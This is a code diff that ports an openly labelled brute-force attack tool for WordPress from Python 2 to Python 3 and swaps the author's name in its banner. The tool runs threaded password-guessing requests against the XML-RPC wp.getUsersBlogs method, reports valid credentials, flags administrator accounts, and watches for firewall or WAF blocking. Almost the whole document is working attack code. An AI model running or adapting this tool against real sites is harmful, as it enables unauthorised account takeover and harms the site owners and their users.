@@ -2,10 +2,10 @@ import re
 import sys
 import time
 import socket
-import urllib2
+import urllib.request as request
 import argparse
 import threading
-from urlparse import urljoin
+from urllib.parse import urljoin
 
 __author__ = 'n00py'
 # These variables must be shared by all threads dynamically
@@ -43,15 +43,16 @@ def slice_list(input, size):
     iterator = iter(input)
     for i in range(size):
         result.append([])
-        for j in range(slice_size):
-            result[i].append(iterator.next())
+        for j in range(int(slice_size)):
+            result[i].append(next(iterator))
         if remain:
-            result[i].append(iterator.next())
+            result[i].append(next(iterator))
             remain -= 1
     return result
 
 
-def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
+
+def worker(wordlist,thread_no,url,args,userlist):
     global total
     global correct_pairs
     for n in wordlist:
@@ -63,20 +64,20 @@ def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
             if user not in correct_pairs:
                 if user != "":
                     if password != "":
-                        PasswordAttempt(user,password,url,thread_no,verbose,debug,agent)
+                        PasswordAttempt(user,password,url.encode("ascii"),thread_no, args.verbose, args.debug, args.agent, args)
         total += 1
 
 
-def BuildThreads(list_array,url,debug,userlist,verbose,agent):
-    if debug:
-        print "Here is the content of the wordlists for each thread"
+def BuildThreads(list_array,url,args, userlist):
+    if args.debug:
+        print("Here is the content of the wordlists for each thread")
         for i in range(len(list_array)):
-            print "Thread " + str(i)
+            print("Thread " + str(i))
             printout(str(list_array[i]), YELLOW)
-            print "\n-----------------------------------------------------"
+            print("\n-----------------------------------------------------")
     threads = []
     for i in range(len(list_array)):
-        t = threading.Thread(target=worker, args=(list_array[i], i, url,userlist,verbose,debug,agent))
+        t = threading.Thread(target=worker, args=(list_array[i], i, url, args, userlist))
         t.daemon = True
         threads.append(t)
         t.start()
@@ -91,86 +92,86 @@ def PrintBanner(input,wordlist,url,userlist,passlist):
          ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
         /  \-'~;   ||     |                v.1.0.0
        /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
-     =(  _____||________|                 ~n00py~
+     =(  _____||________|                 ~M@x~
     """
-    print banner
-    print ("Username List: %s" % input) + " (" + str(len(userlist)) + ")"
-    print ("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")"
-    print ("URL: %s" % url)
+    print(banner)
+    print(("Username List: %s" % input) + " (" + str(len(userlist)) + ")")
+    print(("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")")
+    print(("URL: %s" % url))
 
 
 def TestSite(url):
     protocheck(url)
-    print "Trying: " + url
+    print("Trying: " + url)
     try:
-        urllib2.urlopen(url, timeout=3)
-    except urllib2.HTTPError, e:
+        request.urlopen(url, timeout=3)
+    except request.HTTPError as e:
         if e.code == 405:
-            print url + " found!"
-            print "Now the brute force will begin!  >:)"
+            print(url + " found!")
+            print("Now the brute force will begin!  >:)")
         if e.code == 404:
             printout(str(e), YELLOW)
-            print " - XMLRPC has been moved, removed, or blocked"
+            print (" - XMLRPC has been moved, removed, or blocked")
             sys.exit()
-    except urllib2.URLError, g:
+    except request.URLError as g:
         printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
         sys.exit()
     except socket.timeout as e:
-        print type(e)
+        print(type(e))
         printout("The socket timed out, try it again.", YELLOW)
         sys.exit()
 
 
-def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
+def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent, args):
     global passlist
     if verbose is True or debug is True:
         if debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
-        print "Trying " + user + " : " + password + "\n",
-    headers = {'User-Agent': agent,
-               'Connection': 'keep-alive',
-               'Accept': 'text/html'
-               }
+        print("Trying " + user + " : " + password + "\n" )
+    headers = {'User-Agent': agent ,
+               'Connection': 'keep-alive' ,
+               'Accept': 'text/html' 
+               } 
     post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
     try:
-        req = urllib2.Request(url, post, headers)
-        response = urllib2.urlopen(req, timeout=3)
+        req = request.Request(url, post.encode('ascii'), headers)
+        response = request.urlopen(req, timeout=3)
         the_page = response.read()
         look_for = "isAdmin"
         try:
             splitter = the_page.split(look_for, 1)[1]
             correct_pairs[user] = password
-            print "--------------------------"
+            print("--------------------------")
             success = "[" + user + " : " + password + "] are valid credentials!  "
             adminAlert = ""
             if splitter[23] == "1":
                 adminAlert = "- THIS ACCOUNT IS ADMIN"
             printout(success, GREEN)
             printout(adminAlert, RED)
-            print "\n--------------------------"
+            print("\n--------------------------")
         except:
             pass
-    except urllib2.URLError, e:
-        if e.code == 404 or e.code == 403:
+    except request.URLError as e:
+        if e.errno == 404 or e.errno == 403:
             global total
             printout(str(e), YELLOW)
-            print " - WAF or security plugin likely in use"
+            print(" - WAF or security plugin likely in use")
             total = len(passlist)
             sys.exit()
         else:
             printout(str(e), YELLOW)
-            print " - Try reducing Thread count "
+            print(" - Try reducing Thread count ")
             if args.verbose is True or args.debug is True:
-                print user + ":" + password + " was skipped"
+                print(user + ":" + password + " was skipped")
     except socket.timeout as e:
         printout(str(e), YELLOW)
-        print " - Try reducing Thread count "
+        print(" - Try reducing Thread count ")
         if args.verbose is True or args.debug is True:
-            print user + ":" + password + " was skipped"
+            print(user + ":" + password + " was skipped")
     except socket.error as e:
         printout(str(e), YELLOW)
-        print " - Got an RST, Probably tripped the firewall\n",
+        print(" - Got an RST, Probably tripped the firewall\n")
         total = len(passlist)
         sys.exit()
 
@@ -211,16 +212,16 @@ def main():
     TestSite(url)
 
     list_array = slice_list(passlist, args.threads)
-    BuildThreads(list_array,url,args.debug,userlist,args.verbose,args.agent)
+    BuildThreads(list_array,url,args, userlist)
     while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
             time.sleep(0.1)
             sys.stdout.flush()
             percent = "%.0f%%" % (100 * (total)/len(passlist))
-            print " " + percent + " Percent Complete\r",
+            print(" " + percent + " Percent Complete\r")
     
-    print "\nAll correct pairs:"
+    print("\nAll correct pairs:")
     printout(str(correct_pairs), GREEN)
-    print ""
+    print("")
 
 if __name__ == "__main__":
     main()
